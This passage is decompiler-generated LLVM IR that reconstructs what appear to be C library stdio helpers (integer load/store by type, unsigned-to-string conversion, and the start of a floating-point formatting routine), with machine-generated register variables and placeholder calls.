  %v4_804f1a0 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804f1a0, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_804f1a8 = bitcast i16* %arg1 to i32*
  %v2_804f1a8 = load i32, i32* %v1_804f1a8, align 4
  store i32 %v2_804f1a8, i32* %eax.global-to-local, align 4
  %v1_804f1aa = urem i32 %v2_804f1a8, 65536
  store i32 %v1_804f1aa, i32* %edx.global-to-local, align 4
  %v2_804f1ad = and i32 %v1_804f1aa, %arg2
  %v3_804f1ad = icmp eq i32 %v2_804f1ad, 0
  %v1_804f1af = icmp eq i1 %v3_804f1ad, false
  br i1 %v1_804f1af, label %dec_label_pc_804f1be, label %dec_label_pc_804f1b1

dec_label_pc_804f1b1:                             ; preds = %entry
  %v1_804f1b1 = and i32 %v2_804f1a8, 2176
  %v2_804f1b1 = icmp eq i32 %v1_804f1b1, 0
  store i32 %v1_804f1b1, i32* %edx.global-to-local, align 4
  %v1_804f1b7 = icmp eq i1 %v2_804f1b1, false
  br i1 %v1_804f1b7, label %dec_label_pc_804f1c6, label %dec_label_pc_804f1b9

dec_label_pc_804f1b9:                             ; preds = %dec_label_pc_804f1b1
  %v2_804f1b9 = or i32 %v2_804f1a8, %arg2
  store i32 %v2_804f1b9, i32* %eax.global-to-local, align 4
  %v1_804f1bb = trunc i32 %v2_804f1b9 to i16
  store i16 %v1_804f1bb, i16* %arg1, align 2
  %v0_804f1be.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f1be

dec_label_pc_804f1be:                             ; preds = %entry, %dec_label_pc_804f1b9
  %v0_804f203 = phi i32 [ %v4_804f1a0, %entry ], [ %v0_804f1be.pre, %dec_label_pc_804f1b9 ]
  %v1_804f1be = inttoptr i32 %v0_804f203 to i16*
  %v2_804f1be = load i16, i16* %v1_804f1be, align 2
  %v3_804f1be = zext i16 %v2_804f1be to i32
  store i32 %v3_804f1be, i32* %edx.global-to-local, align 4
  %v2_804f1c1 = and i16 %v2_804f1be, 32
  %v3_804f1c1 = icmp eq i16 %v2_804f1c1, 0
  br i1 %v3_804f1c1, label %dec_label_pc_804f1da, label %dec_label_pc_804f1c6

dec_label_pc_804f1c6:                             ; preds = %dec_label_pc_804f1be, %dec_label_pc_804f1b1
  %v1_804f1c6 = call i32 @__errno_location(i32 %v0_804f19c)
  store i32 %v1_804f1c6, i32* %eax.global-to-local, align 4
  %v1_804f1cb = inttoptr i32 %v1_804f1c6 to i32*
  store i32 9, i32* %v1_804f1cb, align 4
  br label %dec_label_pc_804f1d1

dec_label_pc_804f1d1:                             ; preds = %dec_label_pc_804f1f1, %dec_label_pc_804f1c6
  %v0_804f1d1 = load i32, i32* @ebx, align 4
  %v1_804f1d1 = inttoptr i32 %v0_804f1d1 to i16*
  %v2_804f1d1 = load i16, i16* %v1_804f1d1, align 2
  %v3_804f1d1 = or i16 %v2_804f1d1, 8
  store i16 %v3_804f1d1, i16* %v1_804f1d1, align 2
  store i32 -1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f234

dec_label_pc_804f1da:                             ; preds = %dec_label_pc_804f1be
  %v2_804f1da = urem i16 %v2_804f1be, 4
  %v3_804f1da = icmp eq i16 %v2_804f1da, 0
  br i1 %v3_804f1da, label %dec_label_pc_804f220, label %dec_label_pc_804f1df

dec_label_pc_804f1df:                             ; preds = %dec_label_pc_804f1da
  %v2_804f1df = and i32 %v3_804f1be, 4
  %v3_804f1df = icmp eq i32 %v2_804f1df, 0
  %v1_804f1e2 = icmp eq i1 %v3_804f1df, false
  br i1 %v1_804f1e2, label %dec_label_pc_804f210, label %dec_label_pc_804f1e4

dec_label_pc_804f1e4:                             ; preds = %dec_label_pc_804f1df
  %v1_804f1e4 = add i32 %v0_804f203, 20
  %v2_804f1e4 = inttoptr i32 %v1_804f1e4 to i32*
  %v3_804f1e4 = load i32, i32* %v2_804f1e4, align 4
  store i32 %v3_804f1e4, i32* %eax.global-to-local, align 4
  %v2_804f1e7 = add i32 %v0_804f203, 16
  %v3_804f1e7 = inttoptr i32 %v2_804f1e7 to i32*
  %v4_804f1e7 = load i32, i32* %v3_804f1e7, align 4
  %v15_804f1e7 = icmp eq i32 %v3_804f1e4, %v4_804f1e7
  %v1_804f1ea = icmp eq i1 %v15_804f1e7, false
  br i1 %v1_804f1ea, label %dec_label_pc_804f1f1, label %dec_label_pc_804f1ec

dec_label_pc_804f1ec:                             ; preds = %dec_label_pc_804f1e4
  %v2_804f1ec = and i32 %v3_804f1be, 2
  %v3_804f1ec = icmp eq i32 %v2_804f1ec, 0
  br i1 %v3_804f1ec, label %dec_label_pc_804f210, label %dec_label_pc_804f1f1

dec_label_pc_804f1f1:                             ; preds = %dec_label_pc_804f1ec, %dec_label_pc_804f1e4
  %v1_804f1f1 = and i32 %v3_804f1be, 1024
  store i32 %v1_804f1f1, i32* %edx.global-to-local, align 4
  %tmp18 = udiv i32 %v1_804f1f1, 1024
  %tmp19 = xor i32 %tmp18, 3
  store i32 %tmp19, i32* %eax.global-to-local, align 4
  %v5_804f204 = call i32 @__GI_fseek(i32 %v0_804f203, i32 0, i32 %tmp19, i32 %v1_804f1f1)
  store i32 %v5_804f204, i32* %eax.global-to-local, align 4
  %v1_804f20c = icmp eq i32 %v5_804f204, 0
  %v1_804f20e = icmp eq i1 %v1_804f20c, false
  br i1 %v1_804f20e, label %dec_label_pc_804f1d1, label %dec_label_pc_804f1f1.dec_label_pc_804f210_crit_edge

dec_label_pc_804f1f1.dec_label_pc_804f210_crit_edge: ; preds = %dec_label_pc_804f1f1
  %v0_804f210.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f210

dec_label_pc_804f210:                             ; preds = %dec_label_pc_804f1f1.dec_label_pc_804f210_crit_edge, %dec_label_pc_804f1ec, %dec_label_pc_804f1df
  %v10_804f210 = phi i32 [ %v0_804f210.pre, %dec_label_pc_804f1f1.dec_label_pc_804f210_crit_edge ], [ %v0_804f203, %dec_label_pc_804f1ec ], [ %v0_804f203, %dec_label_pc_804f1df ]
  %v1_804f210 = inttoptr i32 %v10_804f210 to i16*
  %v2_804f210 = load i16, i16* %v1_804f210, align 2
  %v3_804f210 = and i16 %v2_804f210, -4
  store i16 %v3_804f210, i16* %v1_804f210, align 2
  %v0_804f214 = load i32, i32* @ebx, align 4
  %v1_804f214 = add i32 %v0_804f214, 8
  %v2_804f214 = inttoptr i32 %v1_804f214 to i32*
  %v3_804f214 = load i32, i32* %v2_804f214, align 4
  store i32 %v3_804f214, i32* %eax.global-to-local, align 4
  %v2_804f217 = add i32 %v0_804f214, 24
  %v3_804f217 = inttoptr i32 %v2_804f217 to i32*
  store i32 %v3_804f214, i32* %v3_804f217, align 4
  %v0_804f21a = load i32, i32* %eax.global-to-local, align 4
  %v1_804f21a = load i32, i32* @ebx, align 4
  %v2_804f21a = add i32 %v1_804f21a, 16
  %v3_804f21a = inttoptr i32 %v2_804f21a to i32*
  store i32 %v0_804f21a, i32* %v3_804f21a, align 4
  %v0_804f21d = load i32, i32* %eax.global-to-local, align 4
  %v1_804f21d = load i32, i32* @ebx, align 4
  %v2_804f21d = add i32 %v1_804f21d, 20
  %v3_804f21d = inttoptr i32 %v2_804f21d to i32*
  store i32 %v0_804f21d, i32* %v3_804f21d, align 4
  %v0_804f220.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f220

dec_label_pc_804f220:                             ; preds = %dec_label_pc_804f1da, %dec_label_pc_804f210
  %v9_804f220 = phi i32 [ %v0_804f203, %dec_label_pc_804f1da ], [ %v0_804f220.pre, %dec_label_pc_804f210 ]
  %v1_804f220 = inttoptr i32 %v9_804f220 to i16*
  %v2_804f220 = load i16, i16* %v1_804f220, align 2
  %v3_804f220 = or i16 %v2_804f220, 64
  store i16 %v3_804f220, i16* %v1_804f220, align 2
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_804f226 = load i32, i32* @ebx, align 4
  %v1_804f226 = inttoptr i32 %v0_804f226 to i16*
  %v2_804f226 = load i16, i16* %v1_804f226, align 2
  %v3_804f226 = zext i16 %v2_804f226 to i32
  store i32 %v3_804f226, i32* %eax.global-to-local, align 4
  %v3_804f229 = and i16 %v2_804f226, 2816
  %v4_804f229 = icmp eq i16 %v3_804f229, 0
  %v1_804f22c = icmp eq i1 %v4_804f229, false
  br i1 %v1_804f22c, label %dec_label_pc_804f234, label %dec_label_pc_804f22e

dec_label_pc_804f22e:                             ; preds = %dec_label_pc_804f220
  %v1_804f22e = add i32 %v0_804f226, 12
  %v2_804f22e = inttoptr i32 %v1_804f22e to i32*
  %v3_804f22e = load i32, i32* %v2_804f22e, align 4
  store i32 %v3_804f22e, i32* %eax.global-to-local, align 4
  %v2_804f231 = add i32 %v0_804f226, 28
  %v3_804f231 = inttoptr i32 %v2_804f231 to i32*
  store i32 %v3_804f22e, i32* %v3_804f231, align 4
  %v0_804f234.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f234

dec_label_pc_804f234:                             ; preds = %dec_label_pc_804f220, %dec_label_pc_804f1d1, %dec_label_pc_804f22e
  %v0_804f234 = phi i32 [ 0, %dec_label_pc_804f220 ], [ -1, %dec_label_pc_804f1d1 ], [ %v0_804f234.pre, %dec_label_pc_804f22e ]
  store i32 %v0_804f234, i32* %eax.global-to-local, align 4
  %v2_804f236 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f236, i32* %edx.global-to-local, align 4
  store i32 %v0_804f19c, i32* @ebx, align 4
  ret i32 %v0_804f234

; uselistorder directives
  uselistorder i32 %v0_804f234, { 1, 0 }
  uselistorder i32 %v0_804f226, { 1, 0, 2 }
  uselistorder i32 %tmp19, { 1, 0 }
  uselistorder i32 %v1_804f1f1, { 1, 0, 2 }
  uselistorder i32 %v0_804f203, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_804f1aa, { 1, 0 }
  uselistorder i32 %v2_804f1a8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_804f19c, { 1, 0 }
  uselistorder i16 64, { 1, 0 }
  uselistorder i32 1024, { 0, 7, 6, 5, 8, 3, 1, 2, 4 }
  uselistorder i16 8, { 1, 3, 4, 2, 5, 0 }
  uselistorder i16 0, { 4, 5, 6, 0, 7, 1, 8, 2, 3 }
  uselistorder i16 32, { 3, 0, 1, 2 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f234, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f220, { 1, 0 }
  uselistorder label %dec_label_pc_804f1be, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %v5_804f244 = icmp slt i32 %tmp, 0
  %v3_804f26d = and i32 %tmp5, 2048
  %v4_804f26d = icmp eq i32 %v3_804f26d, 0
  br i1 %v5_804f244, label %dec_label_pc_804f26d, label %dec_label_pc_804f24b

dec_label_pc_804f24b:                             ; preds = %entry
  %v1_804f24e = icmp eq i1 %v4_804f26d, false
  br i1 %v1_804f24e, label %dec_label_pc_804f272, label %dec_label_pc_804f250

dec_label_pc_804f250:                             ; preds = %dec_label_pc_804f24b
  %v1_804f250 = inttoptr i32 %tmp4 to i32*
  %v2_804f250 = load i32, i32* %v1_804f250, align 4
  %v6_804f252 = icmp eq i32 %tmp5, 256
  %v1_804f258 = icmp eq i1 %v6_804f252, false
  br i1 %v1_804f258, label %dec_label_pc_804f25f, label %dec_label_pc_804f25a

dec_label_pc_804f25a:                             ; preds = %dec_label_pc_804f250
  %v1_804f25a = urem i32 %v2_804f250, 256
  br label %dec_label_pc_804f26a

dec_label_pc_804f25f:                             ; preds = %dec_label_pc_804f250
  %v6_804f25f = icmp eq i32 %tmp5, 512
  %v1_804f265 = icmp eq i1 %v6_804f25f, false
  br i1 %v1_804f265, label %dec_label_pc_804f26a, label %dec_label_pc_804f267

dec_label_pc_804f267:                             ; preds = %dec_label_pc_804f25f
  %v1_804f267 = urem i32 %v2_804f250, 65536
  br label %dec_label_pc_804f26a

dec_label_pc_804f26a:                             ; preds = %dec_label_pc_804f25f, %dec_label_pc_804f25a, %dec_label_pc_804f267
  %v0_804f26c = phi i32 [ %v2_804f250, %dec_label_pc_804f25f ], [ %v1_804f25a, %dec_label_pc_804f25a ], [ %v1_804f267, %dec_label_pc_804f267 ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_804f26c

dec_label_pc_804f26d:                             ; preds = %entry
  br i1 %v4_804f26d, label %dec_label_pc_804f278, label %dec_label_pc_804f272

dec_label_pc_804f272:                             ; preds = %dec_label_pc_804f26d, %dec_label_pc_804f24b
  %v1_804f272 = add i32 %tmp4, 4
  %v2_804f272 = inttoptr i32 %v1_804f272 to i32*
  %v3_804f272 = load i32, i32* %v2_804f272, align 4
  store i32 %v3_804f272, i32* @edx, align 4
  %v1_804f275 = inttoptr i32 %tmp4 to i32*
  %v2_804f275 = load i32, i32* %v1_804f275, align 4
  ret i32 %v2_804f275

dec_label_pc_804f278:                             ; preds = %dec_label_pc_804f26d
  %v1_804f278 = inttoptr i32 %tmp4 to i32*
  %v2_804f278 = load i32, i32* %v1_804f278, align 4
  %v6_804f27a = icmp eq i32 %tmp5, 256
  %v1_804f280 = icmp eq i1 %v6_804f27a, false
  br i1 %v1_804f280, label %dec_label_pc_804f287, label %dec_label_pc_804f282

dec_label_pc_804f282:                             ; preds = %dec_label_pc_804f278
  %v1_804f282 = mul i32 %v2_804f278, 16777216
  %v2_804f282 = sdiv i32 %v1_804f282, 16777216
  br label %dec_label_pc_804f290

dec_label_pc_804f287:                             ; preds = %dec_label_pc_804f278
  %v6_804f287 = icmp eq i32 %tmp5, 512
  %v1_804f28d = icmp eq i1 %v6_804f287, false
  br i1 %v1_804f28d, label %dec_label_pc_804f290, label %dec_label_pc_804f28f

dec_label_pc_804f28f:                             ; preds = %dec_label_pc_804f287
  %v1_804f28f = mul i32 %v2_804f278, 65536
  %v2_804f28f = sdiv i32 %v1_804f28f, 65536
  br label %dec_label_pc_804f290

dec_label_pc_804f290:                             ; preds = %dec_label_pc_804f287, %dec_label_pc_804f282, %dec_label_pc_804f28f
  %v0_804f290 = phi i32 [ %v2_804f278, %dec_label_pc_804f287 ], [ %v2_804f282, %dec_label_pc_804f282 ], [ %v2_804f28f, %dec_label_pc_804f28f ]
  %v1_804f290 = ashr i32 %v0_804f290, 31
  store i32 %v1_804f290, i32* @edx, align 4
  ret i32 %v0_804f290

; uselistorder directives
  uselistorder i32 %v0_804f290, { 1, 0 }
  uselistorder i32 %v2_804f278, { 2, 0, 1 }
  uselistorder i32 %v2_804f250, { 2, 0, 1 }
  uselistorder i32 %tmp4, { 0, 2, 1, 3 }
  uselistorder i32 16777216, { 1, 0, 3, 2, 4, 6, 5, 8, 7, 10, 9, 12, 11 }
  uselistorder label %dec_label_pc_804f290, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f26a, { 2, 0, 1 }
}

define i32 @_store_inttype() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_2()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804f294 = load i32, i32* @ebx, align 4
  store i32 %v0_804f294, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_804f299 = ptrtoint i16* %tmp5 to i32
  store i32 %v4_804f299, i32* %ebx.global-to-local, align 4
  %v4_804f29d = trunc i32 %tmp4 to i16
  %v6_804f2a5 = icmp eq i32 %tmp6, 256
  %v1_804f2ab = icmp eq i1 %v6_804f2a5, false
  br i1 %v1_804f2ab, label %dec_label_pc_804f2b1, label %dec_label_pc_804f2ad

dec_label_pc_804f2ad:                             ; preds = %entry
  %v2_804f2ad = trunc i32 %tmp4 to i8
  %v4_804f2ad = bitcast i16* %tmp5 to i8*
  store i8 %v2_804f2ad, i8* %v4_804f2ad, align 1
  br label %dec_label_pc_804f2cf

dec_label_pc_804f2b1:                             ; preds = %entry
  %v6_804f2b1 = icmp eq i32 %tmp6, 2048
  %v1_804f2b7 = icmp eq i1 %v6_804f2b1, false
  br i1 %v1_804f2b7, label %dec_label_pc_804f2c0, label %dec_label_pc_804f2b9

dec_label_pc_804f2b9:                             ; preds = %dec_label_pc_804f2b1
  %sext2 = mul i32 %tmp4, 65536
  %v1_804f2b9 = sdiv i32 %sext2, 65536
  %v3_804f2b9 = bitcast i16* %tmp5 to i32*
  store i32 %v1_804f2b9, i32* %v3_804f2b9, align 4
  %v0_804f2bb = load i32, i32* %edx.global-to-local, align 4
  %v1_804f2bb = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f2bb = add i32 %v1_804f2bb, 4
  %v3_804f2bb = inttoptr i32 %v2_804f2bb to i32*
  store i32 %v0_804f2bb, i32* %v3_804f2bb, align 4
  br label %dec_label_pc_804f2cf

dec_label_pc_804f2c0:                             ; preds = %dec_label_pc_804f2b1
  %v6_804f2c0 = icmp eq i32 %tmp6, 512
  %v1_804f2c6 = icmp eq i1 %v6_804f2c0, false
  br i1 %v1_804f2c6, label %dec_label_pc_804f2cd, label %dec_label_pc_804f2c8

dec_label_pc_804f2c8:                             ; preds = %dec_label_pc_804f2c0
  store i16 %v4_804f29d, i16* %tmp5, align 2
  br label %dec_label_pc_804f2cf

dec_label_pc_804f2cd:                             ; preds = %dec_label_pc_804f2c0
  %sext3 = mul i32 %tmp4, 65536
  %v1_804f2cd = sdiv i32 %sext3, 65536
  %v3_804f2cd = bitcast i16* %tmp5 to i32*
  store i32 %v1_804f2cd, i32* %v3_804f2cd, align 4
  br label %dec_label_pc_804f2cf

dec_label_pc_804f2cf:                             ; preds = %dec_label_pc_804f2c8, %dec_label_pc_804f2b9, %dec_label_pc_804f2ad, %dec_label_pc_804f2cd
  %v2_804f2cf = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f2cf, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_804f2d0 = sdiv i32 %sext, 65536
  ret i32 %v1_804f2d0

; uselistorder directives
  uselistorder i32 512, { 0, 1, 2, 6, 3, 7, 8, 4, 5 }
  uselistorder label %dec_label_pc_804f2cf, { 3, 0, 1, 2 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_804f2df = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f2df, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_804f2eb = icmp slt i32 %arg4, 0
  %v1_804f2ed = icmp eq i1 %v2_804f2eb, false
  br i1 %v1_804f2ed, label %dec_label_pc_804f30e, label %dec_label_pc_804f2ef

dec_label_pc_804f2ef:                             ; preds = %entry
  %v1_804f2ef = sub i32 0, %arg4
  store i32 %v1_804f2ef, i32* %esi.global-to-local, align 4
  %v2_804f2f1 = icmp slt i32 %arg3, 0
  %v1_804f2f3 = icmp eq i1 %v2_804f2f1, false
  br i1 %v1_804f2f3, label %dec_label_pc_804f30e, label %dec_label_pc_804f2f5

dec_label_pc_804f2f5:                             ; preds = %dec_label_pc_804f2ef
  %v1_804f2f5 = sub i32 0, %arg2
  %v5_804f2f5 = icmp ne i32 %arg2, 0
  store i32 %v1_804f2f5, i32* %ecx.global-to-local, align 4
  %v2_804f2f7 = zext i1 %v5_804f2f5 to i32
  %v3_804f2f7 = add i32 %v2_804f2f7, %arg3
  %v1_804f302 = sub i32 0, %v3_804f2f7
  store i32 %v1_804f302, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f30e

dec_label_pc_804f30e:                             ; preds = %entry, %dec_label_pc_804f2ef, %dec_label_pc_804f2f5
  %v0_804f313 = phi i32 [ %v1_804f2ef, %dec_label_pc_804f2f5 ], [ %v1_804f2ef, %dec_label_pc_804f2ef ], [ %arg4, %entry ]
  %stack_var_-28.0 = phi i32 [ 1, %dec_label_pc_804f2f5 ], [ 0, %dec_label_pc_804f2ef ], [ 0, %entry ]
  %div = udiv i32 -1, %v0_804f313
  %tmp35 = urem i32 -1, %v0_804f313
  %v1_804f315 = add i32 %tmp35, 1
  store i8 0, i8* %arg1, align 1
  %v1_804f319 = load i32, i32* %esi.global-to-local, align 4
  %v12_804f319 = icmp eq i32 %v1_804f315, %v1_804f319
  %v1_804f323 = icmp eq i1 %v12_804f319, false
  br i1 %v1_804f323, label %dec_label_pc_804f332, label %dec_label_pc_804f325

dec_label_pc_804f325:                             ; preds = %dec_label_pc_804f30e
  %v1_804f325 = add i32 %div, 1
  br label %dec_label_pc_804f332

dec_label_pc_804f332:                             ; preds = %dec_label_pc_804f30e, %dec_label_pc_804f325
  %stack_var_-20.0.off0 = phi i32 [ %v1_804f315, %dec_label_pc_804f30e ], [ 0, %dec_label_pc_804f325 ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_804f30e ], [ %v1_804f325, %dec_label_pc_804f325 ]
  %v0_804f332 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_804f332, i32* %ebp.global-to-local, align 4
  %v0_804f334 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804f334, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f33a

dec_label_pc_804f33a:                             ; preds = %dec_label_pc_804f379, %dec_label_pc_804f332
  %v0_804f371 = phi i32 [ %v0_804f38a, %dec_label_pc_804f379 ], [ %v0_804f332, %dec_label_pc_804f332 ]
  %v0_804f33e = phi i32 [ %v1_804f38c, %dec_label_pc_804f379 ], [ %v0_804f334, %dec_label_pc_804f332 ]
  %v1_804f33a = icmp eq i32 %v0_804f33e, 0
  br i1 %v1_804f33a, label %dec_label_pc_804f371, label %dec_label_pc_804f33e

dec_label_pc_804f33e:                             ; preds = %dec_label_pc_804f33a
  %v0_804f342 = load i32, i32* %esi.global-to-local, align 4
  %div7 = udiv i32 %v0_804f33e, %v0_804f342
  %tmp36 = urem i32 %v0_804f33e, %v0_804f342
  store i32 %div7, i32* %ebx.global-to-local, align 4
  %div8 = udiv i32 %v0_804f371, %v0_804f342
  %tmp37 = urem i32 %v0_804f371, %v0_804f342
  store i32 %div8, i32* %ebp.global-to-local, align 4
  %v6_804f355 = mul i32 %tmp36, %stack_var_-20.0.off0
  %v2_804f359 = add i32 %tmp37, %v6_804f355
  %v8_804f35f = mul i32 %tmp36, %stack_var_-24.0.in
  %v2_804f364 = add i32 %div8, %v8_804f35f
  store i32 %v2_804f364, i32* %ecx.global-to-local, align 4
  %div9 = udiv i32 %v2_804f359, %v0_804f342
  %tmp38 = urem i32 %v2_804f359, %v0_804f342
  %v2_804f36c = add i32 %div9, %v2_804f364
  br label %dec_label_pc_804f379

dec_label_pc_804f371:                             ; preds = %dec_label_pc_804f33a
  %v0_804f375 = load i32, i32* %esi.global-to-local, align 4
  %div12 = udiv i32 %v0_804f371, %v0_804f375
  %tmp39 = urem i32 %v0_804f371, %v0_804f375
  br label %dec_label_pc_804f379

dec_label_pc_804f379:                             ; preds = %dec_label_pc_804f33e, %dec_label_pc_804f371
  %v0_804f37f = phi i32 [ %tmp38, %dec_label_pc_804f33e ], [ %tmp39, %dec_label_pc_804f371 ]
  %storemerge = phi i32 [ %v2_804f36c, %dec_label_pc_804f33e ], [ %div12, %dec_label_pc_804f371 ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_804f379 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f379 = add i32 %v0_804f379, -1
  store i32 %v1_804f379, i32* %edi.global-to-local, align 4
  %tmp40 = icmp ult i32 %v0_804f37f, 10
  %storemerge14.in.v = select i1 %tmp40, i32 48, i32 %arg5
  %storemerge14.in = add i32 %storemerge14.in.v, %v0_804f37f
  %v8_804f37f = trunc i32 %storemerge14.in to i8
  %v3_804f388 = inttoptr i32 %v1_804f379 to i8*
  store i8 %v8_804f37f, i8* %v3_804f388, align 1
  %v0_804f38a = load i32, i32* %ebp.global-to-local, align 4
  %v1_804f38c = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f38c = or i32 %v1_804f38c, %v0_804f38a
  %v3_804f38c = icmp eq i32 %v2_804f38c, 0
  %v1_804f38e = icmp eq i1 %v3_804f38c, false
  br i1 %v1_804f38e, label %dec_label_pc_804f33a, label %dec_label_pc_804f390

dec_label_pc_804f390:                             ; preds = %dec_label_pc_804f379
  %v4_804f390 = icmp eq i32 %stack_var_-28.0, 0
  br i1 %v4_804f390, label %dec_label_pc_804f39b, label %dec_label_pc_804f397

dec_label_pc_804f397:                             ; preds = %dec_label_pc_804f390
  %v0_804f397 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f397 = add i32 %v0_804f397, -1
  store i32 %v1_804f397, i32* %edi.global-to-local, align 4
  %v1_804f398 = inttoptr i32 %v1_804f397 to i8*
  store i8 45, i8* %v1_804f398, align 1
  br label %dec_label_pc_804f39b

dec_label_pc_804f39b:                             ; preds = %dec_label_pc_804f390, %dec_label_pc_804f397
  %v0_804f39e = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_804f39e

; uselistorder directives
  uselistorder i32 %v2_804f359, { 1, 0 }
  uselistorder i32 %v0_804f342, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_804f33e, { 1, 0, 2 }
  uselistorder i32 %v0_804f371, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804f313, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i8 45, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f39b, { 1, 0 }
  uselistorder label %dec_label_pc_804f379, { 1, 0 }
  uselistorder label %dec_label_pc_804f332, { 1, 0 }
  uselistorder label %dec_label_pc_804f30e, { 2, 1, 0 }
}

define i32 @_fpmaxtostr() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp103 = call i16 @__decompiler_undefined_function_5()
  %tmp112 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804f3a9 = load i32, i32* @edi, align 4
  %v0_804f3aa = load i32, i32* @esi, align 4
  %v0_804f3ab = load i32, i32* @ebx, align 4
  store i32 %v0_804f3ab, i32* %stack_var_-16, align 4
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v4_804f3c0 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_804f3c0 = add i3 %v4_804f3c0, -1
  store i3 %v5_804f3c0, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_804f3c7 = add i32 %tmp112, 4
  %v2_804f3c7 = inttoptr i32 %v1_804f3c7 to i32*
  %v3_804f3c7 = load i32, i32* %v2_804f3c7, align 4
  store i32 %v3_804f3c7, i32* %eax.global-to-local, align 4
  %v1_804f3ce = add i32 %tmp112, 8
  %v2_804f3ce = inttoptr i32 %v1_804f3ce to i8*
  %v3_804f3ce = load i8, i8* %v2_804f3ce, align 1
  %v4_804f3ce = zext i8 %v3_804f3ce to i32
  %v5_804f3ce = load i32, i32* @ecx, align 4
  %v6_804f3ce = and i32 %v5_804f3ce, -256
  %v7_804f3ce = or i32 %v6_804f3ce, %v4_804f3ce
  store i32 %v7_804f3ce, i32* %ecx.global-to-local, align 4
  %v1_804f3d1 = inttoptr i32 %tmp112 to i32*
  %v2_804f3d1 = load i32, i32* %v1_804f3d1, align 4
  store i32 %v2_804f3d1, i32* %ebp.global-to-local, align 4
  %v3_804f3d3 = and i32 %v3_804f3c7, -256
  %v4_804f3d3 = or i32 %v3_804f3d3, %v4_804f3ce
  %v1_804f3d9 = or i32 %v4_804f3d3, 32
  %v3_804f3d9 = trunc i32 %v1_804f3d9 to i8
  store i32 %v1_804f3d9, i32* %eax.global-to-local, align 4
  %v10_804f3e4 = icmp eq i8 %v3_804f3d9, 97
